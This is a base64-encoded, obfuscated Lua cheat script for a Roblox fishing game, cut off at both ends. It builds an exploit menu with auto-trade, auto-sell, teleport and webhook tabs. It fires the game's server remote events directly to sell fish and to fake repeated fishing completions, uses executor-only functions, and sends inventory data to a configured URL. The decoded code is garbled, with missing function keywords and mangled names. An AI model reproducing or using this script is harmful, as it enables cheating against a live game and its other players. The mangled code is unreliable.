J1ZX0pCmxvY2FsIHZhcl94N2JwMW4gPSBBbGR5VG9pYTpUYWIoe1RpdGxlID0gIkNvbmZpZ3VyYXRpb24iLCBJY29uID0gIndyZW5jaCIsIFNob3dUYWJUaXRsZSA9IHRydWV9KQpsb2NhbCB2YXJfa291OHFnID0gQWxkeVRvaWE6VGFiKHtUaXRsZSA9ICJBdXRvIFRyYWRlIiwgSWNvbiA9ICJkb2xsYXItc2lnbiIsIFNob3dUYWJUaXRsZSA9IHRydWV9KQpsb2NhbCB2YXJfcGZheHZ4ID0gQWxkeVRvaWE6VGFiKHtUaXRsZSA9ICJBdXRvIEZhdm9yaXRlIiwgSWNvbiA9ICJoZWFydCIsIFNob3dUYWJUaXRsZSA9IHRydWV9KQpsb2NhbCB2YXJfN2Zvem5uID0gQWxkeVRvaWE6VGFiKHtUaXRsZSA9ICJBdXRvIEVuY2hhbnQiLCBJY29uID0gInJlcGVhdCIsIFNob3dUYWJUaXRsZSA9IHRydWV9KQpsb2NhbCB2YXJfcG45cXlxID0gQWxkeVRvaWE6VGFiKHtUaXRsZSA9ICJXZWF0aGVyIiwgSWNvbiA9ICJjbG91ZC1kcml6emxlIiwgU2hvd1RhYlRpdGxlID0gdHJ1ZX0pCmxvY2FsIHZhcl81bGV3d2sgPSBBbGR5VG9pYTpUYWIoe1RpdGxlID0gIlRlbGVwb3J0IiwgSWNvbiA9ICJtYXAtcGluIiwgU2hvd1RhYlRpdGxlID0gdHJ1ZX0pCmxvY2FsIHZhcl9rZDZtaGwgPSBBbGR5VG9pYTpUYWIoe1RpdGxlID0gIkJ1eSBSb2QgJiBCYWl0IiwgSWNvbiA9ICJwYWNrYWdlIiwgU2hvd1RhYlRpdGxlID0gdHJ1ZX0pCmxvY2FsIHZhcl9tYzdmeDcgPSBBbGR5VG9pYTpUYWIoe1RpdGxlID0gIlRlbXBsZSIsIEljb24gPSAid3JlbmNoIiwgU2hvd1RhYlRpdGxlID0gdHJ1ZX0pCmxvY2FsIHZhcl9yNmVlczAgPSBBbGR5VG9pYTpUYWIoe1RpdGxlID0gIldlYmhvb2siLCBJY29uID0gImluZm8iLCBTaG93VGFiVGl0bGUgPSB0cnVlfSkKbG9jYWwgdmFyXzczOGtuYiA9IEFsZHlUb2lpOlRhYih7VGl0bGUgPSAiSW50ZXJmYWNlIiwgSWNvbiA9ICJsYXlvdXQtZGFzaGJvYXJkIiwgU2hvd1RhYlRpdGxlID0gdHJ1ZX0pCmxvY2FsIHZhcl8wcWxxNG8gPSBBbGR5VG9paTpUYWIoe1RpdGxlID0gIlNlcnZlciBJbmZvIiwgSWNvbiA9ICJzZXJ2ZXIiLCBTaG93VGFiVGl0bGUgPSB0cnVlfSkKbG9jYWwgdmFyX2p6M2lxcSA9IEFsZHlUb2lMOldhaXRGb3JDaGlsZCgiUkVfRmlzaGluZ1N0b3BwZWQiKQpsb2NhbCB2YXJfajh0Y2ptID0gdHJ1ZQpsb2NhbCB2YXJfeTQ3Y3ZvID0gdHJ1ZQpsb2NhbCB2YXJfaWRhYWg2ID0gdHJ1ZQpsb2NhbCB2YXJfYnB2amdqID0gdHJ1ZQpsb2NhbCB2YXJfMWl6MTQ5ID0gMApsb2NhbCB2YXJfeHFvNDVtID0gMApsb2NhbCB2YXJfd3NxNzlpID0gcmVxdWlyZSgoQWxkeVRvaUg6V2FpdEZvckNoaWxkKCJDb250cm9sbGVycyIpKTpXYWl0Rm9yQ2hpbGQoIkZpc2hpbmdDb250cm9sbGVyIikpCmxvY2FsIHZhcl8zN3Z1emMgPSBBbGR5VG9pRy5DaGFyYWN0ZXIgb3IgQWxkeVRvaUcuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCmxvY2FsIHZhcl84OXpucGQgPSBBbGR5VG9pelU6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCmxvY2FsIHZhcl9mamdiZG8gPSAiMTM5NjIyMzA3MTAzNjA4Igpsb2NhbCB2YXJfMDl0NXhlID0gIjkyNDIxMDcxNjUzMjczIgpsb2NhbCB2YXJfbng2azdrID0gInJieGFzc2V0aWQ6Ly85MjMzMDc1MjQ5Igpsb2NhbCB2YXJfMGt6a2E2ID0gInJieGFzc2V0aWQ6Ly85MjMzMDY4OTk3Igpsb2NhbCB2YXJfa2ltZjBvID0gIjgzMTkwMjAzOTc1NjQ5Igpsb2NhbCB2YXJfODByYW13ID0gInJieGFzc2V0aWQ6Ly8xMjM0NTY3ODkiCmxvY2FsIHZhcl9tMmt2bjAgPSAicmJ4YXNzZXRpZDovLzEzNDU2Nzg5MCIKbG9jYWwgdmFyX3gzb3ZlNCA9ICIxMjY4MzE4MTUzOTc3MjQiCmxvY2FsIHZhcl9wMnVrdzEgPSAicmJ4YXNzZXRpZDovLzEyMzQ1Njc4OSIKbG9jYWwgdmFyXzA0eDU1NCA9IHtlbmFibGVkID0gZmFsc2UsIGNvbm5lY3Rpb24gPSBuaWwsIGxhc3RGaXNoID0gIiIsIGxhc3RTZW5kID0gMCwgZGlzY29yZElkID0gIiIsIGN1c3RvbVVybCA9ICJBbGR5VG9pIn0KQWxkeVRvaUZVLnNlbGVjdGVkVGllcnMgPSB7fQoKbG9jYWwgdmFyX203NHFheiBBbGR5VG9pWFUoKQogICAgbG9jYWwgdmFyX2Vhc20xbiA9IEFsZHlUb2lULkxvY2FsUGxheWVyCiAgICBsb2NhbCB2YXJfMnF0ZXVmID0gKEFsZHlUb2lRLlBsYXllckd1aTpXYWl0Rm9yQ2hpbGQoIk1haW5VSSIpKTpXYWl0Rm9yQ2hpbGQoIkRpc3BsYXkiKQogICAgZm9yIEFsZHlUb2lRLCBBbGR5VG9pVCBpbiBpcGFpcnMoQWxkeVRvaWM6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBsb2NhbCB2YXJfbG9mMTFoLCBBbGR5VG9pWSA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgcmV0dXJuIEFsZHlUb2lULklubmVyLlRhZ3NbIml0ZW1Bc3NldElkIl0KICAgICAgICBlbmQpCiAgICAgICAgaWYgQWxkeVRvaWMgYW5kIChBbGR5VG9pWSBhbmQgQWxkeVRvaVk6SXNBKCJTdHJpbmdWYWx1ZSIpKSB0aGVuCiAgICAgICAgICAgIGxvY2FsIHZhcl9sYXI5NDQgPSBBbGR5VG9pWS5WYWx1ZQogICAgICAgICAgICByZXR1cm4gQWxkeVRvaVEKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIG5pbAplbmQKCmxvY2FsIHZhcl96M3M0MHYgQWxkeVRvaURVKEFsZHlUb2lRKQogICAgQWxkeVRvaVEuY3VzdG9tVXJsID0gQWxkeVRvaUZVLmN1c3RvbVVybAogICAgbG9jYWwgdmFyX2N5anB4OCA9IEFsZHlUb2lPOkpTT05FbmNvZGUoQWxkeVRvaVEpCiAgICBsb2NhbCB2YXJfbG42MXBxID0gQWxkeVRvaU86VXJsRW5jb2RlKEFsZHlUb2lUKQogICAgbG9jYWwgdmFyX2d3cjN2eSA9IGZhbHNlCiAgICBsb2NhbCB2YXJfNnl5YzdyLCBBbGR5VG9pTyA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCB2YXJfOHJ3azg1ID0gQWxkeVRvaXM6UmVxdWVzdEFzeW5jKHsKICAgICAgICAgICAgVXJsID0gQWxkeVRvaVggLi4gKCI/ZGF0YT0iIC4uIEFsZHlUb2ljKSwKICAgICAgICAgICAgTWV0aG9kID0gIkdFVCIKICAgICAgICB9KQogICAgICAgIGlmIEFsZHlUb2lRIGFuZCBBbGR5VG9pUS5TdWNjZXNzIHRoZW4KICAgICAgICAgICAgQWxkeVRvaVkgPSB0cnVlCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICBpZiBub3QgQWxkeVRvaVkgdGhlbgogICAgICAgIGxvY2FsIHZhcl9tZTEyeTAgPSBodHRwX3JlcXVlc3Qgb3IgcmVxdWVzdCBvciBzeW4gYW5kIHN5bi5yZXF1ZXN0CiAgICAgICAgaWYgQWxkeVRvaVEgdGhlbgogICAgICAgICAgICBsb2NhbCB2YXJfaHBveDhiID0gQWxkeVRvaVEoewogICAgICAgICAgICAgICAgVXJsID0gQWxkeVRvaVggLi4gKCI/ZGF0YT0iIC4uIEFsZHlUb2ljKSwKICAgICAgICAgICAgICAgIE1ldGhvZCA9ICJHRVQiLAogICAgICAgICAgICAgICAgSGVhZGVycyA9IHsKICAgICAgICAgICAgICAgICAgICBbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIGlmIEFsZHlUb2lUIGFuZCAoQWxkeVRvaVQuU3RhdHVzQ29kZSA9PSAyMDAgb3IgQWxkeVRvaVQuU3VjY2VzcykgdGhlbgogICAgICAgICAgICAgICAgQWxkeVRvaVkgPSB0cnVlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICBpZiBub3QgQWxkeVRvaVkgdGhlbgogICAgICAgIGxvY2FsIHZhcl95a2cwMXUsIEFsZHlUb2lUID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBnYW1lOkh0dHBHZXQoQWxkeVRvaVggLi4gKCI/ZGF0YT0iIC4uIEFsZHlUb2ljKSkKICAgICAgICBlbmQpCiAgICAgICAgaWYgQWxkeVRvaVEgdGhlbgogICAgICAgICAgICBBbGR5VG9pWSA9IHRydWUKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIHZhcl80MDAzamogQWxkeVRvaUxVKEFsZHlUb2lRKQogICAgZm9yIEFsZHlUb2lULCBBbGR5VG9pYyBpbiBwYWlycyhBbGR5VG9pbjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIEFsZHlUb2ljOklzQSgiTW9kdWxlU2NyaXB0IikgdGhlbgogICAgICAgICAgICBsb2NhbCB2YXJfOXU5a3UwLCBBbGR5VG9pWSA9IHBjYWxsKHJlcXVpcmUsIEFsZHlUb2ljKQogICAgICAgICAgICBpZiBBbGR5VG9pVCBhbmQgKEFsZHlUb2lZIGFuZCAoQWxkeVRvaVkuRGF0YSBhbmQgQWxkeVRvaVkuRGF0YS5JZCA9PSBBbGR5VG9pUSkpIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBBbGR5VG9pWQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIG5pbAplbmQKCmxvY2FsIHZhcl84Z2Jqb3AgQWxkeVRvaU5VKCkKICAgIGxvY2FsIHZhcl83cDlraW8gPSBBbGR5VG9pSjpHZXQoIkludmVudG9yeSIpCiAgICBpZiBub3QgQWxkeVRvaVEgb3Igbm90IEFsZHlUb2lRLkl0ZW1zIHRoZW4gcmV0dXJuIGVuZAogICAgZm9yIEFsZHlUb2lRLCBBbGR5VG9pVCBpbiBwYWlycyhBbGR5VG9pUS5JdGVtcykgZG8KICAgICAgICBsb2NhbCB2YXJfYWprZHBzID0gQWxkeVRvaUxVKEFsZHlUb2lULklkKQogICAgICAgIGlmIEFsZHlUb2ljIGFuZCAoQWxkeVRvaWMuRGF0YS5UeXBlID09ICJmaXNoZXMiIGFuZCBBbGR5VG9pYy5Qcm9iYWJpbGl0eSkgdGhlbgogICAgICAgICAgICBsb2NhbCB2YXJfMXBwYmwxID0gQWxkeVRvaUYuR2V0VGllckZyb21SYXJpdHkobmlsLCBBbGR5VG9pYy5Qcm9iYWJpbGl0eS5DaGFuY2UpCiAgICAgICAgICAgIGlmIEFsZHlUb2lRIGFuZCBBbGR5VG9pUS5OYW1lID09ICJMZWdlbmRhcnkiIHRoZW4KICAgICAgICAgICAgICAgIGlmIEFsZHlUb2lULlVVSUQgYW5kIG5vdCBBbGR5VG9pVC5GYXZvcml0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgIEFsZHlUb2lyOkZpcmVTZXJ2ZXIoQWxkeVRvaVQuVVVJRCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIHZhcl85MmlleWkgQWxkeVRvaWtVKCkKICAgIGxvY2FsIHZhcl8zcGN3dmogPSBBbGR5VG9pSjpHZXQoIkRhdGEiKQogICAgaWYgbm90IEFsZHlUb2lRIG9yIG5vdCBBbGR5VG9pUS5JdGVtcyB0aGVuIHJldHVybiBlbmQKICAgIGZvciBBbGR5VG9pUSwgQWxkeVRvaVQgaW4gcGFpcnMoQWxkeVRvaVEuSXRlbXMpIGRvCiAgICAgICAgbG9jYWwgdmFyX3ZscDJiZiA9IEFsZHlUb2lMVShBbGR5VG9pVC5JZCkKICAgICAgICBpZiBBbGR5VG9pYyBhbmQgKEFsZHlUb2ljLkRhdGEuVHlwZSA9PSAiZmlzaGVzIiBhbmQgQWxkeVRvaWMuUHJvYmFiaWxpdHkpIHRoZW4KICAgICAgICAgICAgbG9jYWwgdmFyX3d0aDJzaCA9IEFsZHlUb2lGLkdldFRpZXJGcm9tUmFyaXR5KG5pbCwgQWxkeVRvaWMuUHJvYmFiaWxpdHkuQ2hhbmNlKQogICAgICAgICAgICBpZiBBbGR5VG9pUSBhbmQgQWxkeVRvaVEuTmFtZSA9PSAiTXl0aGljYWwiIHRoZW4KICAgICAgICAgICAgICAgIGlmIEFsZHlUb2lULlVVSUQgYW5kIG5vdCBBbGR5VG9pVC5GYXZvcml0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgIEFsZHlUb2lyOkZpcmVTZXJ2ZXIoQWxkeVRvaVQuVVVJRCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIHZhcl93cGowdnMgQWxkeVRvaVVVKCkKICAgIGxvY2FsIHZhcl91NDk2ZnUgPSBBbGR5VG9pSjpHZXQoIkludmVudG9yeSIpCiAgICBpZiBub3QgQWxkeVRvaVEgb3Igbm90IEFsZHlUb2lRLkl0ZW1zIHRoZW4gcmV0dXJuIGVuZAogICAgZm9yIEFsZHlUb2lRLCBBbGR5VG9pVCBpbiBwYWlycyhBbGR5VG9pUS5JdGVtcykgZG8KICAgICAgICBsb2NhbCB2YXJfdDNwZnV4ID0gQWxkeVRvaUxVKEFsZHlUb2lULklkKQogICAgICAgIGlmIEFsZHlUb2ljIGFuZCAoQWxkeVRvaWMuRGF0YS5UeXBlID09ICJmaXNoZXMiIGFuZCBBbGR5VG9pYy5Qcm9iYWJpbGl0eSkgdGhlbgogICAgICAgICAgICBsb2NhbCB2YXJfaHRoa3U0ID0gQWxkeVRvaUYuR2V0VGllckZyb21SYXJpdHkobmlsLCBBbGR5VG9pYy5Qcm9iYWJpbGl0eS5DaGFuY2UpCiAgICAgICAgICAgIGlmIEFsZHlUb2lRIGFuZCBBbGR5VG9pUS5OYW1lID09ICJTRUNSRVQiIHRoZW4KICAgICAgICAgICAgICAgIGlmIEFsZHlUb2lULlVVSUQgYW5kIG5vdCBBbGR5VG9pVC5GYXZvcml0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgIEFsZHlUb2lyOkZpcmVTZXJ2ZXIoQWxkeVRvaVQuVVVJRCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIHZhcl9rOHdmYmIgPSB7CiAgICBbNV0gPSBmYWxzZSwKICAgIFs2XSA9IGZhbHNlLAogICAgWzddID0gZmFsc2UKfQoKbG9jYWwgdmFyXzQzbGFzayA9IHt9Cgpsb2NhbCB2YXJfaWdtOGlmIEFsZHlUb2l2VShBbGR5VG9pUSkKICAgIGxvY2FsIHZhcl9kaDM2c3IgPSBBbGR5VG9pSDpGaW5kRmlyc3RDaGlsZCgiaXRlbXMiKQogICAgaWYgbm90IEFsZHlUb2lUIHRoZW4gcmV0dXJuIG5pbCBlbmQKICAgIGxvY2FsIHZhcl9nZnVmejkgPSBBbGR5VG9pUSBvciAibm9uZSIKICAgIEFsZHlUb2ljID0gKEFsZHlUb2ljOmdzdWIoIiVzIiwgIiIpKTpnc3ViKCIlcCIsICIiKQogICAgbG9jYWwgdmFyX2lza2p4ZSA9IHN0cmluZy5sb3dlcihBbGR5VG9pYykKICAgIGxvY2FsIHZhcl9iN2VhMDUsIEFsZHlUb2lPID0gbmlsLCAwCiAgICBmb3IgQWxkeVRvaVEsIEFsZHlUb2lUIGluIGlwYWlycyhBbGR5VG9pVDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIEFsZHlUb2lUOklzQSgiTW9kdWxlU2NyaXB0IikgdGhlbgogICAgICAgICAgICBsb2NhbCB2YXJfbWRnZWdrID0gc3RyaW5nLmxvd2VyKEFsZHlUb2lULk5hbWUpCiAgICAgICAgICAgIGlmIEFsZHlUb2lZOmZpbmQoQWxkeVRvaVEsIDEsIHRydWUpIHRoZW4KICAgICAgICAgICAgICAgIGlmICNBbGR5VG9pVC5OYW1lID4gQWxkeVRvaU8gdGhlbgogICAgICAgICAgICAgICAgICAgIEFsZHlUb2lPID0gI0FsZHlUb2lULk5hbWUKICAgICAgICAgICAgICAgICAgICBBbGR5VG9pRyA9IEFsZHlUb2lUCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIGlmIEFsZHlUb2lHIHRoZW4gcmV0dXJuIEFsZHlUb2lHIGVuZAogICAgZm9yIEFsZHlUb2lRLCBBbGR5VG9pVCBpbiBpcGFpcnMoQWxkeVRvaVQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBBbGR5VG9pVDpJc0EoIk1vZHVsZVNjcmlwdCIpIHRoZW4KICAgICAgICAgICAgbG9jYWwgdmFyX2s2cXpmMiwgQWxkeVRvaWMgPSBwY2FsbChyZXF1aXJlLCBBbGR5VG9pVCkKICAgICAgICAgICAgaWYgQWxkeVRvaVEgYW5kICh0eXBlKEFsZHlUb2ljKSA9PSAidGFibGUiIGFuZCAoQWxkeVRvaWMuRGF0YSBhbmQgdHlwZShBbGR5VG9pYy5EYXRhLk5hbWUpID09ICJzdHJpbmciKSkgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgdmFyXzE3cG1reiA9IEFsZHlUb2ljLkRhdGEuTmFtZQogICAgICAgICAgICAgICAgbG9jYWwgdmFyX2xpMzNhdiA9IChBbGR5VG9pUTpnc3ViKCIlcyIsICIiKSk6Z3N1YigiW14ld10iLCAiIikKICAgICAgICAgICAgICAgIGlmIHN0cmluZy5sb3dlcihBbGR5VG9pRykgPT0gQWxkeVRvaVkgb3Igc3RyaW5nLmxvd2VyKEFsZHlUb2lRKSA9PSBBbGR5VG9pWSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEFsZHlUb2lUCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBuaWwKZW5kCgpsb2NhbCB2YXJfcWx4Y2QyIEFsZHlUb2lXVShBbGR5VG9pUSwgQWxkeVRvaVQpCiAgICBpZiBBbGR5VG9pUTpGaW5kRmlyc3RDaGlsZCgiU2VsbFByaWNlTGFiZWwiKSB0aGVuCiAgICAgICAgQWxkeVRvaVEuU2VsbFByaWNlTGFiZWwuVGV4dCA9ICIkIiAuLiB0b3N0cmluZyhBbGR5VG9pVCkKICAgICAgICByZXR1cm4KICAgIGVuZAogICAgbG9jYWwgdmFyX21zem83MyA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIEFsZHlUb2ljLk5hbWUgPSAiU2VsbFByaWNlTGFiZWwiCiAgICBBbGR5VG9pYy5UZXh0ID0gIlNlbGwgJCIgLi4gdG9zdHJpbmcoQWxkeVRvaVQpCiAgICBBbGR5VG9pYy5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDI0KQogICAgQWxkeVRvaWMuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMCwgQWxkeVRvaVEuSXRlbU5hbWUuUG9zaXRpb24uWSArIDIpCiAgICBBbGR5VG9pYy5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgQWxkeVRvaWMuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjE1LCAwKQogICAgQWxkeVRvaWMuRm9udCA9IEVudW0uRm9udC5VYnVudHVCb2xkCiAgICBBbGR5VG9pYy5UZXh0U2NhbGVkID0gdHJ1ZQogICAgQWxkeVRvaWMuUGFyZW50ID0gQWxkeVRvaVEKICAgIGxvY2FsIHZhcl9oeTAza2wgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikKICAgIEFsZHlUb2lZLlRoaWNrbmVzcyA9IDIKICAgIEFsZHlUb2lZLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKICAgIEFsZHlUb2lZLkFwcGx5U3Ryb2tlTW9kZSA9IEVudW0uQXBwbHlTdHJva2VNb2RlLkJvcmRlcgogICAgQWxkeVRvaVkuUGFyZW50ID0gQWxkeVRvaWMKZW5kCgpsb2NhbCB2YXJfc2k4MTFiID0gMAoKbG9jYWwgdmFyX3Z6aTRxaCBBbGR5VG9pU1UoKQogICAgQWxkeVRvaWhVID0gMAogICAgZm9yIEFsZHlUb2lRLCBBbGR5VG9pVCBpbiBpcGFpcnMoQWxkeVRvaVU6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBBbGR5VG9pVDpGaW5kRmlyc3RDaGlsZCgiaXRlbUFzc2V0SWQiKSB0aGVuCiAgICAgICAgICAgIGxvY2FsIHZhcl9ocmZtaXUgPSBBbGR5VG9pVC5pdGVtQXNzZXRJZC5WYWx1ZQogICAgICAgICAgICBsb2NhbCB2YXJfaXk5djdoID0gQWxkeVRvaXZVKEFsZHlUb2lRKQogICAgICAgICAgICBpZiBBbGR5VG9pYyB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfNDl3bzJ6LCBBbGR5VG9pWSA9IHBjYWxsKHJlcXVpcmUsIEFsZHlUb2ljKQogICAgICAgICAgICAgICAgaWYgQWxkeVRvaVEgYW5kIChBbGR5VG9pWSBhbmQgKEFsZHlUb2lZLkRhdGEgYW5kIEFsZHlUb2lZLlNlbGxQcmljZSkpIHRoZW4KICAgICAgICAgICAgICAgICAgICBBbGR5VG9pV1UoQWxkeVRvaVQsIEFsZHlUb2lZLlNlbGxQcmljZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgQWxkeVRvaVkgYW5kIChBbGR5VG9pWS5TZWxsUHJpY2UgYW5kIEFsZHlUb2lZLkRhdGEuVHlwZSA9PSAiZmlzaGVzIikgdGhlbgogICAgICAgICAgICAgICAgICAgIEFsZHlUb2loVSA9IEFsZHlUb2loVSArIEFsZHlUb2lZLlNlbGxQcmljZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICBsb2NhbCB2YXJfeXM5emFoID0gKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpKS5Mb2NhbFBsYXllcgogICAgbG9jYWwgdmFyX3I5Zzd2ZCA9IChBbGR5VG9pUTpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpKTpXYWl0Rm9yQ2hpbGQoIkludmVudG9yeSIpCiAgICBsb2NhbCB2YXJfNXNodXdlID0gQWxkeVRvaVQ6V2FpdEZvckNoaWxkKCJJbnZlbnRvcnlfQmFnU2l6ZSIpCiAgICBsb2NhbCB2YXJfOTlsNWJ4ID0gQWxkeVRvaWM6V2FpdEZvckNoaWxkKCJUZXh0TGFiZWwiKQogICAgbG9jYWwgdmFyX3kxcWJsMyA9IEFsZHlUb2lZOldhaXRGb3JDaGlsZCgiTGFiZWwiKQogICAgQWxkeVRvaUcuVGV4dCA9IEFsZHlUb2loVQplbmQKCmxvY2FsIHZhcl95a3htdnogQWxkeVRvaVpVKCkKICAgIGxvY2FsIHZhcl8yMW9udWsgPSBBbGR5VG9pSjpHZXQoIkludmVudG9yeSIpCiAgICBpZiBub3QgQWxkeVRvaVEgb3Igbm90IEFsZHlUb2lRLkl0ZW1zIHRoZW4gcmV0dXJuIGVuZAogICAgZm9yIEFsZHlUb2lRLCBBbGR5VG9pVCBpbiBwYWlycyhBbGR5VG9pUS5JdGVtcykgZG8KICAgICAgICBsb2NhbCB2YXJfcXBrenhrID0gQWxkeVRvaUxVKEFsZHlUb2lULklkKQogICAgICAgIGlmIEFsZHlUb2ljIGFuZCBBbGR5VG9pYy5EYXRhLlR5cGUgPT0gImZpc2hlcyIgdGhlbgogICAgICAgICAgICBpZiBBbGR5VG9pVC5VVUlEIGFuZCBub3QgQWxkeVRvaVQuRmF2b3JpdGVkIHRoZW4KICAgICAgICAgICAgICAgIEFsZHlUb2lyOkZpcmVTZXJ2ZXIoQWxkeVRvaVQuVVVJRCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCB2YXJfOW5zczk3IEFsZHlUb2liVSgpCiAgICBsb2NhbCB2YXJfamkxeGQxID0gQWxkeVRvaUo6R2V0KCJJbnZlbnRvcnkiKQogICAgaWYgbm90IEFsZHlUb2lRIG9yIG5vdCBBbGR5VG9pUS5JdGVtcyB0aGVuIHJldHVybiBlbmQKICAgIGZvciBBbGR5VG9pUSwgQWxkeVRvaVQgaW4gcGFpcnMoQWxkeVRvaVEuSXRlbXMpIGRvCiAgICAgICAgbG9jYWwgdmFyX3NscW8xMCA9IEFsZHlUb2lMVShBbGR5VG9pVC5JZCkKICAgICAgICBpZiBBbGR5VG9pYyBhbmQgQWxkeVRvaWMuRGF0YS5UeXBlID09ICJmaXNoZXMiIHRoZW4KICAgICAgICAgICAgaWYgQWxkeVRvaVQuVVVJRCBhbmQgQWxkeVRvaVQuRmF2b3JpdGVkIHRoZW4KICAgICAgICAgICAgICAgIEFsZHlUb2lyOkZpcmVTZXJ2ZXIoQWxkeVRvaVQuVVVJRCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgooZ2V0Z2VudigpKS5SZW1vdGVGdW5jdGlvbiA9IEFsZHlUb2lILlJlcGxpb24ubmV0LlJGX0Zpc2hpbmdSb2RDaGFyZ2UKCmxvY2FsIHZhcl8yMHFsYnQgPSB7fQoKbG9jYWwgdmFyX3BzbmMxdiBBbGR5VG9paVUoQWxkeVRvaVEsIEFsZHlUb2lUKQogICAgbG9jYWwgdmFyXzJrZXNpYSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgdmFyXzlpeXJldCA9IEFsZHlUb2ljLkNoYXJhY3RlciBvciBBbGR5VG9pYy5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgIGxvY2FsIHZhcl82YWMyeWEgPSBBbGR5VG9pWTpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKICAgIGZvciBBbGR5VG9pUSwgQWxkeVRvaVQgaW4gaXBhaXJzKEFsZHlUb2lHOkdldFBsYXlpbmdBbmltYXRpb25UcmFja3MoKSkgZG8KICAgICAgICBBbGR5VG9pVDpTdG9wKCkKICAgIGVuZAogICAgbG9jYWwgdmFyXzU1bXB1NCA9IEluc3RhbmNlLm5ldygiQW5pbWF0aW9uIikKICAgIEFsZHlUb2lPLkFuaW1hdGlvbklkID0gInJieGFzc2V0aWQ6Ly8iIC4uIEFsZHlUb2lRCiAgICBsb2NhbCB2YXJfODVzZGt4ID0gQWxkeVRvaUc6TG9hZEFuaW1hdGlvbihBbGR5VG9pTykKICAgIEFsZHlUb2lzOlBsYXkoKQogICAgdGFzay5kZWxheShBbGR5VG9pVCwgZnVuY3Rpb24oKQogICAgICAgIGlmIEFsZHlUb2lzLklzUGxheWluZyB0aGVuCiAgICAgICAgICAgIEFsZHlUb2lzOlN0b3AoKQogICAgICAgIGVuZAogICAgZW5kKQogICAgcmV0dXJuIEFsZHlUb2lzCmVuZAoKbG9jYWwgdmFyX3JhMHY0cSBBbGR5VG9palUoKQogICAgQWxkeVRvaVE6Tm90aWZ5KHsKICAgICAgICBUaXRsZSA9ICJNaW5pZ2FtZSIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiQXV0byBmaXNoIG1pbmlnYW1lIGRldGVjdGVkLiIsCiAgICAgICAgRHVyYXRpb24gPSAxCiAgICB9KQogICAgZm9yIEFsZHlUb2lRID0gMSwgMTAsIDEgZG8KICAgICAgICBBbGR5VG9pSS5SRV9GaXNoaW5nQ29tcGxldGVkOkZpcmVTZXJ2ZXIoKQogICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICBlbmQKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBpZiBBbGR5VG9peFUgYW5kIEFsZHlUb2l4VS5SZXF1ZXN0Q2xpZW50U3RvcEZpc2hpbmcgdGhlbgogICAgICAgICAgICBBbGR5VG9peFU6UmVxdWVzdENsaWVudFN0b3BGaXNoaW5nKHRydWUpCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAoKbG9jYWwgdmFyX2V4Z3RrcCwgQWxkeVRvaUtVLCBBbGR5VG9pRVUsIEFsZHlUb2lQVSwgQWxkeVRvaUFVID0gbmlsLCBuaWwsIG5pbCwgbmlsLCBuaWwKCmxvY2FsIHZhcl9qMjFxc2YgQWxkeVRvaW1VKCkKICAgIGlmIEFsZHlUb2lNVSB0aGVuCiAgICAgICAgQWxkeVRvaU1VOkRpc2Nvb